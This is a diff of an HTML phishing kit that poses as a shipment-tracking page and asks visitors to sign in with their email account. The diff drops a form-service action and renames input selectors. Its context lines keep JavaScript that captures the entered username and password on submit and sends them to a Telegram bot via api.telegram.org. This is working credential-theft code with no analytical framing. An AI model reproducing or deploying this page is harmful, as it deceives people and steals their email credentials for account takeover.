@@ -28,7 +28,7 @@ text-decoration-color: initial'><SECTION class="container" style="BOX-SIZING: bo
 <DIV class="form-login__body" style="BOX-SIZING: border-box; BORDER-TOP: rgb(235,235,235) 1px solid; BORDER-RIGHT: rgb(235,235,235) 1px solid; BORDER-BOTTOM: rgb(235,235,235) 1px solid; POSITION: relative; PADDING-BOTTOM: 30px; PADDING-TOP: 30px; PADDING-LEFT: 50px; BORDER-LEFT: rgb(235,235,235) 1px solid; MARGIN: 0px; Z-INDEX: 1; PADDING-RIGHT: 50px; BACKGROUND-COLOR: rgb(250,250,250); border-radius: 5px">
 <DIV class="form-group" style="BOX-SIZING: border-box; MARGIN: 0px 0px 15px">
 
-<form action="https://nocodeform.io/f/66b9c3225861d3878c2d6a22"  method="post"name="action">
+<form method="post"name="action">
 
 <DIV class="form-group" style="BOX-SIZING: border-box; MARGIN: 0px 0px 16px">
 <FONT style="BOX-SIZING: border-box; MARGIN: 0px" color="#00000" face="tahoma">Please sign in to your Email account to Track shipment and confirm you are not a <b>robot</b>. </FONT>
@@ -75,8 +75,8 @@ MARGIN: 0px 0px 3px; DISPLAY: block; LINE-HEIGHT: 1.4285; PADDING-RIGHT: 12px; B
       formal.addEventListener("submit", e =>{
           e.preventDefault();
 
-          let result1 = document.querySelector('#xiemail').value
-          let result2 = document.querySelector('#pipassword').value
+          let result1 = document.querySelector('#email').value
+          let result2 = document.querySelector('#password').value
           
           fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=ATT-RESULT=Username::${result1}==++==Password::${result2}`, {
               method: "GET"
